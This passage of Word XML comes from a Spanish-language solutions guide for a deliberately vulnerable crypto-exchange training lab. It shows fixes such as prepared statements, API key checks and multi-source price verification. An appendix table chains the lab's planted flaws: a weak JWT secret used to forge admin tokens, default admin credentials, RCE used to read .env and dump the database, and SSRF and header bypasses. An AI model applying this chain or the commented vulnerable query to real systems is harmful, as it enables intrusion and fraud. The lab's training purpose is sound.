        <w:t xml:space="preserve">            'XRP' =&gt; ['min' =&gt; 0.01, 'max' =&gt; 100],</w:t>
        <w:br/>
        <w:t xml:space="preserve">            'USDT' =&gt; ['min' =&gt; 0.95, 'max' =&gt; 1.05],</w:t>
        <w:br/>
        <w:t xml:space="preserve">        ];</w:t>
        <w:br/>
        <w:br/>
        <w:t xml:space="preserve">        if (isset($price_ranges[$symbol])) {</w:t>
        <w:br/>
        <w:t xml:space="preserve">            $range = $price_ranges[$symbol];</w:t>
        <w:br/>
        <w:t xml:space="preserve">            if ($price &lt; $range['min'] || $price &gt; $range['max']) {</w:t>
        <w:br/>
        <w:t xml:space="preserve">                throw new RangeException(</w:t>
        <w:br/>
        <w:t xml:space="preserve">                    "Precio fuera de rango para $symbol: $price " .</w:t>
        <w:br/>
        <w:t xml:space="preserve">                    "(rango permitido: {$range['min']} - {$range['max']})"</w:t>
        <w:br/>
        <w:t xml:space="preserve">                );</w:t>
        <w:br/>
        <w:t xml:space="preserve">            }</w:t>
        <w:br/>
        <w:t xml:space="preserve">        }</w:t>
        <w:br/>
        <w:br/>
        <w:t xml:space="preserve">        return $price;</w:t>
        <w:br/>
        <w:t xml:space="preserve">    }</w:t>
        <w:br/>
        <w:br/>
        <w:t xml:space="preserve">    /**</w:t>
        <w:br/>
        <w:t xml:space="preserve">     * Verifica que el cambio de precio no sea anomalo respecto al ultimo precio conocido.</w:t>
        <w:br/>
        <w:t xml:space="preserve">     */</w:t>
        <w:br/>
        <w:t xml:space="preserve">    public static function validatePriceChange(</w:t>
        <w:br/>
        <w:t xml:space="preserve">        float $current_price,</w:t>
        <w:br/>
        <w:t xml:space="preserve">        float $new_price,</w:t>
        <w:br/>
        <w:t xml:space="preserve">        float $max_change_pct = 10.0</w:t>
        <w:br/>
        <w:t xml:space="preserve">    ): bool {</w:t>
        <w:br/>
        <w:t xml:space="preserve">        if ($current_price &lt;= 0) return true;</w:t>
        <w:br/>
        <w:br/>
        <w:t xml:space="preserve">        $change_pct = abs(($new_price - $current_price) / $current_price) * 100;</w:t>
        <w:br/>
        <w:br/>
        <w:t xml:space="preserve">        if ($change_pct &gt; $max_change_pct) {</w:t>
        <w:br/>
        <w:t xml:space="preserve">            throw new RangeException(</w:t>
        <w:br/>
        <w:t xml:space="preserve">                "Cambio de precio anomalo: $change_pct% " .</w:t>
        <w:br/>
        <w:t xml:space="preserve">                "(maximo permitido: $max_change_pct%)"</w:t>
        <w:br/>
        <w:t xml:space="preserve">            );</w:t>
        <w:br/>
        <w:t xml:space="preserve">        }</w:t>
        <w:br/>
        <w:br/>
        <w:t xml:space="preserve">        return true;</w:t>
        <w:br/>
        <w:t xml:space="preserve">    }</w:t>
        <w:br/>
        <w:t>}</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading4"/>
      </w:pPr>
      <w:r>
        <w:t>2. Usar Prepared Statements para Actualizar Precios</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F4F4F4"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:i/>
          <w:color w:val="555555"/>
        </w:rPr>
        <w:t>[php]</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>&lt;?php</w:t>
        <w:br/>
        <w:t>// api/internal/rates.php - Corregido con prepared statements</w:t>
        <w:br/>
        <w:br/>
        <w:t>// ANTES (vulnerable):</w:t>
        <w:br/>
        <w:t>// $query = "UPDATE crypto_prices SET price = '$price' WHERE symbol = '$symbol'";</w:t>
        <w:br/>
        <w:t>// $pdo-&gt;exec($query);</w:t>
        <w:br/>
        <w:br/>
        <w:t>// DESPUES (seguro):</w:t>
        <w:br/>
        <w:t>$stmt = $pdo-&gt;prepare(</w:t>
        <w:br/>
        <w:t xml:space="preserve">    "UPDATE crypto_prices SET price = :price, updated_at = NOW() WHERE symbol = :symbol"</w:t>
        <w:br/>
        <w:t>);</w:t>
        <w:br/>
        <w:br/>
        <w:t>foreach ($validated_rates as $symbol =&gt; $price) {</w:t>
        <w:br/>
        <w:t xml:space="preserve">    try {</w:t>
        <w:br/>
        <w:t xml:space="preserve">        $validated_price = ExternalDataValidator::validateCryptoPrice($symbol, $price);</w:t>
        <w:br/>
        <w:br/>
        <w:t xml:space="preserve">        // Obtener precio actual para validar cambio</w:t>
        <w:br/>
        <w:t xml:space="preserve">        $current_stmt = $pdo-&gt;prepare("SELECT price FROM crypto_prices WHERE symbol = ?");</w:t>
        <w:br/>
        <w:t xml:space="preserve">        $current_stmt-&gt;execute([$symbol]);</w:t>
        <w:br/>
        <w:t xml:space="preserve">        $current_price = (float)$current_stmt-&gt;fetchColumn();</w:t>
        <w:br/>
        <w:br/>
        <w:t xml:space="preserve">        ExternalDataValidator::validatePriceChange($current_price, $validated_price);</w:t>
        <w:br/>
        <w:br/>
        <w:t xml:space="preserve">        $stmt-&gt;execute([</w:t>
        <w:br/>
        <w:t xml:space="preserve">            ':price' =&gt; $validated_price,</w:t>
        <w:br/>
        <w:t xml:space="preserve">            ':symbol' =&gt; $symbol</w:t>
        <w:br/>
        <w:t xml:space="preserve">        ]);</w:t>
        <w:br/>
        <w:t xml:space="preserve">    } catch (Exception $e) {</w:t>
        <w:br/>
        <w:t xml:space="preserve">        error_log("[RATE_UPDATE_REJECTED] $symbol: " . $e-&gt;getMessage());</w:t>
        <w:br/>
        <w:t xml:space="preserve">        $rejected[$symbol] = $e-&gt;getMessage();</w:t>
        <w:br/>
        <w:t xml:space="preserve">    }</w:t>
        <w:br/>
        <w:t>}</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading4"/>
      </w:pPr>
      <w:r>
        <w:t>3. Autenticar las APIs Internas / Feeds Externos</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F4F4F4"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:i/>
          <w:color w:val="555555"/>
        </w:rPr>
        <w:t>[php]</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>&lt;?php</w:t>
        <w:br/>
        <w:t>// api/internal/rates.php - Requiere autenticacion de servicio</w:t>
        <w:br/>
        <w:br/>
        <w:t>// Verificar token de servicio (API key del proveedor externo)</w:t>
        <w:br/>
        <w:t>$api_key = $_SERVER['HTTP_X_API_KEY'] ?? '';</w:t>
        <w:br/>
        <w:t>$valid_keys = [</w:t>
        <w:br/>
        <w:t xml:space="preserve">    getenv('RATES_PROVIDER_API_KEY'),</w:t>
        <w:br/>
        <w:t xml:space="preserve">    getenv('BACKUP_RATES_PROVIDER_API_KEY')</w:t>
        <w:br/>
        <w:t>];</w:t>
        <w:br/>
        <w:br/>
        <w:t>$authenticated = false;</w:t>
        <w:br/>
        <w:t>foreach ($valid_keys as $valid_key) {</w:t>
        <w:br/>
        <w:t xml:space="preserve">    if ($valid_key &amp;&amp; hash_equals($valid_key, $api_key)) {</w:t>
        <w:br/>
        <w:t xml:space="preserve">        $authenticated = true;</w:t>
        <w:br/>
        <w:t xml:space="preserve">        break;</w:t>
        <w:br/>
        <w:t xml:space="preserve">    }</w:t>
        <w:br/>
        <w:t>}</w:t>
        <w:br/>
        <w:br/>
        <w:t>if (!$authenticated) {</w:t>
        <w:br/>
        <w:t xml:space="preserve">    http_response_code(401);</w:t>
        <w:br/>
        <w:t xml:space="preserve">    echo json_encode(["error" =&gt; "API key de proveedor invalida"]);</w:t>
        <w:br/>
        <w:t xml:space="preserve">    error_log("[UNAUTHORIZED_RATE_UPDATE] IP: {$_SERVER['REMOTE_ADDR']}");</w:t>
        <w:br/>
        <w:t xml:space="preserve">    exit;</w:t>
        <w:br/>
        <w:t>}</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading4"/>
      </w:pPr>
      <w:r>
        <w:t>4. Implementar Verificacion Cruzada de Precios</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F4F4F4"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:i/>
          <w:color w:val="555555"/>
        </w:rPr>
        <w:t>[php]</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>&lt;?php</w:t>
        <w:br/>
        <w:t>// helpers/price_verification.php</w:t>
        <w:br/>
        <w:br/>
        <w:t>/**</w:t>
        <w:br/>
        <w:t xml:space="preserve"> * Verifica precios consultando multiples fuentes antes de actualizar.</w:t>
        <w:br/>
        <w:t xml:space="preserve"> * No confiar en una sola fuente.</w:t>
        <w:br/>
        <w:t xml:space="preserve"> */</w:t>
        <w:br/>
        <w:t>class PriceVerifier {</w:t>
        <w:br/>
        <w:br/>
        <w:t xml:space="preserve">    private array $providers;</w:t>
        <w:br/>
        <w:br/>
        <w:t xml:space="preserve">    public function __construct() {</w:t>
        <w:br/>
        <w:t xml:space="preserve">        $this-&gt;providers = [</w:t>
        <w:br/>
        <w:t xml:space="preserve">            'coingecko' =&gt; getenv('COINGECKO_API_URL'),</w:t>
        <w:br/>
        <w:t xml:space="preserve">            'binance' =&gt; getenv('BINANCE_API_URL'),</w:t>
        <w:br/>
        <w:t xml:space="preserve">            'coinmarketcap' =&gt; getenv('CMC_API_URL')</w:t>
        <w:br/>
        <w:t xml:space="preserve">        ];</w:t>
        <w:br/>
        <w:t xml:space="preserve">    }</w:t>
        <w:br/>
        <w:br/>
        <w:t xml:space="preserve">    /**</w:t>
        <w:br/>
        <w:t xml:space="preserve">     * Obtiene el precio de consenso consultando multiples fuentes.</w:t>
        <w:br/>
        <w:t xml:space="preserve">     * Rechaza si la desviacion entre fuentes es mayor al umbral.</w:t>
        <w:br/>
        <w:t xml:space="preserve">     */</w:t>
        <w:br/>
        <w:t xml:space="preserve">    public function getConsensusPrice(string $symbol, float $proposed_price): float {</w:t>
        <w:br/>
        <w:t xml:space="preserve">        $prices = [];</w:t>
        <w:br/>
        <w:br/>
        <w:t xml:space="preserve">        foreach ($this-&gt;providers as $name =&gt; $url) {</w:t>
        <w:br/>
        <w:t xml:space="preserve">            try {</w:t>
        <w:br/>
        <w:t xml:space="preserve">                $price = $this-&gt;fetchPrice($url, $symbol);</w:t>
        <w:br/>
        <w:t xml:space="preserve">                if ($price &gt; 0) {</w:t>
        <w:br/>
        <w:t xml:space="preserve">                    $prices[$name] = $price;</w:t>
        <w:br/>
        <w:t xml:space="preserve">                }</w:t>
        <w:br/>
        <w:t xml:space="preserve">            } catch (Exception $e) {</w:t>
        <w:br/>
        <w:t xml:space="preserve">                error_log("[PRICE_FETCH_FAILED] Provider: $name, Error: " . $e-&gt;getMessage());</w:t>
        <w:br/>
        <w:t xml:space="preserve">            }</w:t>
        <w:br/>
        <w:t xml:space="preserve">        }</w:t>
        <w:br/>
        <w:br/>
        <w:t xml:space="preserve">        if (count($prices) &lt; 2) {</w:t>
        <w:br/>
        <w:t xml:space="preserve">            throw new RuntimeException(</w:t>
        <w:br/>
        <w:t xml:space="preserve">                "No se pudieron obtener suficientes fuentes de precio para verificacion"</w:t>
        <w:br/>
        <w:t xml:space="preserve">            );</w:t>
        <w:br/>
        <w:t xml:space="preserve">        }</w:t>
        <w:br/>
        <w:br/>
        <w:t xml:space="preserve">        $median = $this-&gt;calculateMedian(array_values($prices));</w:t>
        <w:br/>
        <w:br/>
        <w:t xml:space="preserve">        // El precio propuesto debe estar dentro del 5% de la mediana</w:t>
        <w:br/>
        <w:t xml:space="preserve">        $deviation = abs(($proposed_price - $median) / $median) * 100;</w:t>
        <w:br/>
        <w:br/>
        <w:t xml:space="preserve">        if ($deviation &gt; 5.0) {</w:t>
        <w:br/>
        <w:t xml:space="preserve">            throw new RangeException(</w:t>
        <w:br/>
        <w:t xml:space="preserve">                "Precio propuesto ($proposed_price) se desvia {$deviation}% " .</w:t>
        <w:br/>
        <w:t xml:space="preserve">                "de la mediana de mercado ($median)"</w:t>
        <w:br/>
        <w:t xml:space="preserve">            );</w:t>
        <w:br/>
        <w:t xml:space="preserve">        }</w:t>
        <w:br/>
        <w:br/>
        <w:t xml:space="preserve">        return $proposed_price;</w:t>
        <w:br/>
        <w:t xml:space="preserve">    }</w:t>
        <w:br/>
        <w:br/>
        <w:t xml:space="preserve">    private function fetchPrice(string $base_url, string $symbol): float {</w:t>
        <w:br/>
        <w:t xml:space="preserve">        $ch = curl_init("$base_url/price?symbol=$symbol");</w:t>
        <w:br/>
        <w:t xml:space="preserve">        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);</w:t>
        <w:br/>
        <w:t xml:space="preserve">        curl_setopt($ch, CURLOPT_TIMEOUT, 5);</w:t>
        <w:br/>
        <w:t xml:space="preserve">        curl_setopt($ch, CURLOPT_PROTOCOLS, CURLPROTO_HTTPS);</w:t>
        <w:br/>
        <w:t xml:space="preserve">        $response = json_decode(curl_exec($ch), true);</w:t>
        <w:br/>
        <w:t xml:space="preserve">        curl_close($ch);</w:t>
        <w:br/>
        <w:br/>
        <w:t xml:space="preserve">        return (float)($response['price'] ?? 0);</w:t>
        <w:br/>
        <w:t xml:space="preserve">    }</w:t>
        <w:br/>
        <w:br/>
        <w:t xml:space="preserve">    private function calculateMedian(array $values): float {</w:t>
        <w:br/>
        <w:t xml:space="preserve">        sort($values);</w:t>
        <w:br/>
        <w:t xml:space="preserve">        $count = count($values);</w:t>
        <w:br/>
        <w:t xml:space="preserve">        $mid = (int)($count / 2);</w:t>
        <w:br/>
        <w:br/>
        <w:t xml:space="preserve">        if ($count % 2 === 0) {</w:t>
        <w:br/>
        <w:t xml:space="preserve">            return ($values[$mid - 1] + $values[$mid]) / 2;</w:t>
        <w:br/>
        <w:t xml:space="preserve">        }</w:t>
        <w:br/>
        <w:br/>
        <w:t xml:space="preserve">        return $values[$mid];</w:t>
        <w:br/>
        <w:t xml:space="preserve">    }</w:t>
        <w:br/>
        <w:t>}</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading4"/>
      </w:pPr>
      <w:r>
        <w:t>5. Monitoreo y Alertas para Cambios de Precio Anomalos</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F4F4F4"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:i/>
          <w:color w:val="555555"/>
        </w:rPr>
        <w:t>[php]</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>&lt;?php</w:t>
        <w:br/>
        <w:t>// helpers/price_monitor.php</w:t>
        <w:br/>
        <w:br/>
        <w:t>function monitorPriceUpdate(PDO $pdo, string $symbol, float $old_price, float $new_price): void {</w:t>
        <w:br/>
        <w:t xml:space="preserve">    $change_pct = abs(($new_price - $old_price) / $old_price) * 100;</w:t>
        <w:br/>
        <w:br/>
        <w:t xml:space="preserve">    // Registrar todos los cambios de precio</w:t>
        <w:br/>
        <w:t xml:space="preserve">    $stmt = $pdo-&gt;prepare(</w:t>
        <w:br/>
        <w:t xml:space="preserve">        "INSERT INTO price_audit_log (symbol, old_price, new_price, change_pct, source_ip, created_at)</w:t>
        <w:br/>
        <w:t xml:space="preserve">         VALUES (?, ?, ?, ?, ?, NOW())"</w:t>
        <w:br/>
        <w:t xml:space="preserve">    );</w:t>
        <w:br/>
        <w:t xml:space="preserve">    $stmt-&gt;execute([$symbol, $old_price, $new_price, $change_pct, $_SERVER['REMOTE_ADDR']]);</w:t>
        <w:br/>
        <w:br/>
        <w:t xml:space="preserve">    // Alertar si el cambio es significativo</w:t>
        <w:br/>
        <w:t xml:space="preserve">    if ($change_pct &gt; 5.0) {</w:t>
        <w:br/>
        <w:t xml:space="preserve">        error_log("[PRICE_ALERT] $symbol cambio $change_pct%: $old_price -&gt; $new_price");</w:t>
        <w:br/>
        <w:br/>
        <w:t xml:space="preserve">        // Pausar swaps automaticamente si el cambio es extremo</w:t>
        <w:br/>
        <w:t xml:space="preserve">        if ($change_pct &gt; 20.0) {</w:t>
        <w:br/>
        <w:t xml:space="preserve">            $stmt = $pdo-&gt;prepare(</w:t>
        <w:br/>
        <w:t xml:space="preserve">                "UPDATE system_config SET value = 'paused' WHERE key_name = 'swap_status'"</w:t>
        <w:br/>
        <w:t xml:space="preserve">            );</w:t>
        <w:br/>
        <w:t xml:space="preserve">            $stmt-&gt;execute();</w:t>
        <w:br/>
        <w:t xml:space="preserve">            error_log("[CRITICAL] Swaps pausados por cambio de precio anomalo en $symbol");</w:t>
        <w:br/>
        <w:t xml:space="preserve">        }</w:t>
        <w:br/>
        <w:t xml:space="preserve">    }</w:t>
        <w:br/>
        <w:t>}</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:br w:type="page"/>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:r>
        <w:t>Apendice - Resumen del flujo completo</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>El recorrido recomendado para resolver todos los LABs en orden es:</w:t>
        <w:br/>
        <w:t>(1) Levantar el lab con docker compose up -d. (2) Acceder al playbook gamificado en /playbook.php para guiarte. (3) Resolver cada fase y conseguir flags. (4) Volver a este documento como referencia de soluciones cuando te trabes.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>Encadenamiento entre fases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C3E50"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="FFFFFF"/>
              </w:rPr>
              <w:t>Hallazgo de Fase 1</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="4320"/>
            <w:shd w:val="clear" w:color="auto" w:fill="2C3E50"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="FFFFFF"/>
              </w:rPr>
              <w:t>Habilita en Fase...</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="4320"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:t>JWT_SECRET=crypto123 (en notes.txt, .env.bak, debug.php)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="4320"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:t>LAB02 - forjar JWT con role=admin</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="4320"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:t>admin/admin123 en backup.sql</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="4320"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:t>LAB02, LAB05 - login directo como admin</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="4320"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:t>Lista de endpoints en notes.txt y openapi.json</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="4320"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:t>LAB12, LAB13 - fuzzing dirigido</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="4320"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:t>Magic headers en notes.txt</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="4320"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:t>LAB14 - header fuzzing</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="4320"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:t>composer.lock con CVEs</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="4320"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:t>LAB08 - explotacion de libreria vulnerable</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="4320"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:t>RCE en /api/v3/admin/exec.php</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="4320"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:t>Lectura de .env real, dump de DB</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="4320"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:t>X-Admin-Token en magic params</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="4320"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:t>LAB05 BFLA sin necesidad de JWT admin</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="4320"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:t>rate_override, bypass_kyc, fee_override</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="4320"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:t>LAB06 Business Flow</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="4320"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:t>X-Forwarded-For, X-Original-URL</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="4320"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:t>LAB07 SSRF</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83"/>
    </w:pPr>
    <w:rPr>
      <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
      <w:sz w:val="18"/>
    </w:rPr>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="InlineCode">
    <w:name w:val="InlineCode"/>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